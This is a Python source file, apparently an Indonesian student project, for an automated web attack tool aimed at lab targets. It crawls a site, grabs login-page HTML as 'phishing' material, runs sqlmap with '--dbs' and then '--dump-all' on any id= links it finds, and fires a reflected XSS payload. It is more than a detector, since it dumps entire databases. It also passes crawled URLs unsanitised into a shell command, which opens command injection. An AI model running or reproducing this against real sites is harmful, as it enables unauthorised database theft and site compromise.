from bs4 import BeautifulSoup
#import libs
from urllib.parse import *
import urllib.request       # library untuk HTTP request
import urllib.parse         # library untuk memberikan balasan kepada client
from urllib.error import *  # library untuk penanganan Error
import requests
import re
import http.client
from datetime import *
import subprocess

class mainInject:

    def __init__(self, url):
        self.url = url
        self.URLSql = []
        self.URLXss = []
        self.URLPhising = []
        self.srcPhising = []
        self.resultPhising = []
        self.log = list()

        # self.btn_clk(self.url)
        self.phissing(self.url)

    def phissing(self, url):
        alamatURL = url
        # lokasiPath = self.dest.text()
        # saveFileLog = os.path.join(lokasiPath, self.namaFile.text()+'.html')
        # print(saveFileLog)
        # try:
        redirect = requests.get(alamatURL, timeout=5)  # melakukan request terhadap URL
        URLAsli = redirect.url  # mengambil URL yang telah di-redirect / history
        Nomor = 1
        # buatLog = open(saveFileLog, "w")
        print(URLAsli)
        # self.textArea.insertPlainText("Website URL : "+ URLAsli + '\n\n')
        print("Website URL : " + URLAsli + '\n\n')

        response = urllib.request.urlopen(URLAsli).read()
        # print(response.read().decode('utf-8'))

        # --Proses serangan Phising--
        soupPhising = BeautifulSoup(response, 'html5lib')
        kondisiPhising = soupPhising.find_all('a', href=re.compile('login'))
        # print(kondisiPhising)
        if len(kondisiPhising) > 0:
            for b in kondisiPhising:
                self.URLPhising.append(b['href'])
            print(self.URLPhising)
        else:
            print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli, "not vulnerability with Phising attack")
            self.log.append(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli + "not vulnerability with Phising attack")
            # self.textArea.insertPlainText(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli + " not vulnerability with Phising attack\n")
            # buatLog.write(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli + " tidak rentan terhadap serangan Phising\n")
        Nomor = Nomor + 1
        intPhising = 0
        tdkPhising = []
        for phising in self.URLPhising:
            try:
                responsePhising = urllib.request.urlopen(self.URLPhising[intPhising]).read()
                soupCopasPhising = BeautifulSoup(responsePhising, 'html5lib')
                kondisicekPhising = soupCopasPhising.find_all('img', {"src": True})
                # print(kondisicekPhising)
                if len(kondisicekPhising) > 0:
                    letter = ["http"]
                    x = 0
                    for c in kondisicekPhising:
                        self.srcPhising.append(c['src'])
                        first = self.srcPhising[x][:4]
                        if first in letter != -1:
                            self.resultPhising.append("rentan")
                        else:
                            tdkPhising.append("a")
                        x = x + 1
                    print(self.srcPhising)
                    print(len(self.resultPhising))
                    print(len(tdkPhising))
                if len(self.resultPhising) > 0:
                    kondisiCopasPhising = soupCopasPhising.find_all('html')
                    # saveFileHTML = os.path.join(lokasiPath,'index.html')
                    # filePhising = open(saveFileHTML, "w", encoding='utf-8')
                    # filePhising.write(str(kondisiCopasPhising))
                    print(kondisiCopasPhising)
                    # filePhising.close()

                    print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli,
                          "vulnerability with Phising attack")
                    # self.textArea.insertPlainText(datetime.now().strftime(
                    # "%d-%m-%Y %H:%M:%S") + " " + URLAsli + " vulnerability with Phising attack\n")
                    Nomor = Nomor + 1
                else:
                    print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli,
                          "not vulnerability with Phising attack !")
                    self.log.append(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli +
                          "not vulnerability with Phising attack !")

                    # self.textArea.insertPlainText(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli + " not vulnerability with Phising attack\n")
                    # buatLog.write(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " +URLAsli + " tidak rentan terhadap serangan Phising\n")
                    Nomor = Nomor + 1
                intPhising = intPhising + 1
            except (ValueError, URLError) as e:
                print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli,
                      "not vulnerability with Phising attack !")
        # -- Proses Serangan Phising end--

        soup = BeautifulSoup(response, 'html5lib')
        kondisi = soup.find_all('a', href=re.compile(
            'id='))  # mencari tag <a> yang memiliki atribut "href". Kemudian mencari value href yang memiliki kalimat "id=" (Menggunakan regex / regular expression)
        # print(kondisi)

        if len(kondisi) > 0:
            y = urlparse(URLAsli)
            URLFix = y.scheme + "://" + y.netloc + y.path  # mengatur URL (menghilangkan query untuk case "atmaine.fi"
            print(URLFix)
            for a in kondisi:
                self.URLSql.append(URLFix + a['href'])
                self.URLXss.append(URLFix + a['href'])

        self.injection(URLAsli)
        self.xss(URLAsli)

    def injection(self, url):
        URLAsli = url
        # --Proses serangan SQL Injection--
        intSQL = 0
        tdkSQL = []
        for sql in self.URLSql:
            try:
                apa = []
                command = ('sqlmap -u ' + self.URLSql[0] + ' --dbs' + ' --batch')
                result = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
                tulis = open('file.txt', 'w')
                tulis.write(str(result.stdout.read()))
                tulis.close()
                print(result)
                baca = open('file.txt', 'r')
                cari = baca.read()
                apa.append(cari.split("\\n[*]"))
                nilai = 2
                # print()
                for db in apa:
                    print(db[nilai])
                    database = db[nilai]
                    commandDB = ('sqlmap -u ' + self.URLSql[0] + ' -D ' + database + ' --dump-all' + ' --batch')
                    resultDB = subprocess.Popen(commandDB, stdout=subprocess.PIPE, shell=True)
                    tulisDB = open('fileDB.csv', 'w')
                    tulisDB.write(str(resultDB.stdout.read(25373)))
                    tulisDB.close()
                    nilai += 1
                tdkSQL.append("a")
                break
            except HTTPError as e:
                print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + self.URLSql[intSQL], ":", e.code, e.reason)
                intSQL = intSQL + 1
            except http.client.IncompleteRead as e:
                responseSQL = e.partial
        if len(tdkSQL) == 0:
            print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli, "not vulnerability with SQL Injection")
            self.log.append(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli + " not vulnerability with SQL Injection")

        # --Proses serangan SQL Injection end--

    def xss(self, url):
        URLAsli = url
        # --Proses serangan XSS--
        intXSS = 0
        tdkXSS = []
        for xss in self.URLXss:
            try:
                responseXSS = urllib.request.urlopen(
                    self.URLXss[intXSS] + "%22%3E%3Cscript%3Ealert%28222%29%3C%2Fscript%3E").read()
                soupXSS = BeautifulSoup(responseXSS, 'html5lib')
                kondisiXSS = soupXSS.find_all('script', string=re.compile('alert'))
                print(kondisiXSS)
                if len(kondisiXSS) > 0:
                    print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + self.URLXss[
                        intXSS] + " vulnerability with Cross-Site Scripting")
                    #Nomor = Nomor + 1
                    tdkXSS.append("tidak")
                intXSS = intXSS + 1
            except HTTPError as e:
                print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + self.URLXss[intXSS], ":", e.code, e.reason)
                intXSS = intXSS + 1
            except http.client.IncompleteRead as e:
                responseSQL = e.partial
        if len(tdkXSS) == 0:
            print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli,
                  "not vulnerability with Cross-Site Scripting")
            self.log.append(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli + " not vulnerability with Cross-Site Scripting")

            #Nomor = Nomor + 1
            # Proses serangan XSS end--
        # self.textArea.insertPlainText("Complete !!")
        print("complete")

    def return_output(self):
        output = self.log
        return output


        # buatLog.close()
    #except HTTPError as e:
        # self.text.insertPlainText("Error code : " + e.code + e.reason)
        #print("Error code :", e.code, e.reason)
    #except URLError as e:
        #print("Check your internet connection : ", e.reason)
    #     self.text.insertPlainText("Periksa koneksi internet anda : " + e.reason)
    #except ConnectionError as e:
        #print("Error : ", e)
    #     self.text.insertPlainText("Error : " + e)
    #except Exception as e:
        #print("The site cannot be reached")

#MainInject("http://192.168.10.8/1142014131/")
#MainInject("http://192.168.10.8/peruggia/index.php?action=login")